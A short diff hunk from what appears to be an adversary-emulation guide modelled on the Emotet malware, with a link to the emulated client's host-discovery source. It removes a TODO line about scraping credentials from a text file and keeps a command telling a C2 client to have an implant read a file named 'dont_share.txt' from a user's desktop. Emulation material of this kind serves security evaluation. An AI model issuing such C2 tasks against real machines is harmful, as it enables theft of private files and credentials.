@@ -92,7 +92,6 @@ Enumerate processes.
 
 [Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/hostdiscovery.cpp#L172)
 
-TODO: Scrape creds from text file.
 
 ```bash
 ./evalsC2client.py --set-task DESKTOP-9IA6T0M_BA673852 "read C:\\Users\\local_user\\Desktop\\dont_share.txt"
